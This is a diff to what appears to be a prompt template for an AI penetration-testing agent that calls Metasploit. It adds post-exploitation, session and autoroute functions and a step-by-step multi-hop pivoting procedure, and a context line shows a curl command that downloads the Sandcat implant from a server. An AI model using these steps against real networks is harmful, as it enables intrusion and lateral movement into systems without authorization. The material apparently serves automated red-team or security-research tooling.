@@ -15,16 +15,29 @@ curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download >
 You can use the following functions to explore and exploit:
 MetasploitService (Service class, to talk to metasploit)
 - Key Methods:
-  - `search_exploits(cve_id: str)`: Search for exploit modules matching cve_id, sorted best-rank first
-  - `get_exploit_module_options(module_fullname: str)`: Get all the options of a specified exploit module
-  - `get_payload_options(payload_name: str)`: Get all the options of a specified payload module 
-  - `run_exploit(
+    - `search_exploits(cve_id: str)`: Search for exploit modules matching cve_id, sorted best-rank first
+    - `get_exploit_module_options(module_fullname: str)`: Get all the options of a specified exploit module
+    - `get_payload_options(payload_name: str)`: Get all the options of a specified payload module 
+    - `list_sessions()`: List active Metasploit sessions
+    - `run_post_module(module_fullname: str, options: dict[str, Any])`: Run any post module and return a result
+    - `autoroute_add(session_id: str, subnet: str, netmask: str)`: Add an explicit route through a session
+    - `autoroute_print(session_id: str)`: Print routes visible from autoroute post module output and return a RouteTableResult
+    - `autoroute_delete(session_id: str, subnet: str | None = None, netmask: str | None = None)`: Delete a specific route, or all routes on session when subnet/netmask omitted
+    - `run_exploit(
         cve_id: str,
         exploit_module_fullname: str,
         exploit_options: dict[str, Any],
         payload_module_fullname: str,
         payload_options: dict[str, Any],
     )`: Run an exploit using a specific exploit module and its options loaded with a specific payload and its options
+
+For multi-hop pivoting, follow this sequence:
+1. Compromise a reachable pivot host and gain a session.
+2. Call `list_sessions` to identify pivot session IDs.
+3. Add explicit routes with `autoroute_add` using exact `subnet` and `netmask`.
+4. Verify with `autoroute_print`.
+5. Run exploits against deeper hosts through those routes.
+6. Repeat route expansion for additional hops.
 
 === OUTPUT FORMAT ===
 Every response MUST contain exactly ONE <module> block that calls a method. For example:
@@ -45,6 +58,18 @@ For an exploit module:
             "LHOST": "192.168.1.100",
             "LPORT": 4444
         }
+    }
+}
+</module>
+
+Example for route setup:
+<module>
+{
+    "module_name": "autoroute_add",
+    "args": {
+        "session_id": "3",
+        "subnet": "192.168.50.0",
+        "netmask": "255.255.255.0"
     }
 }
 </module>
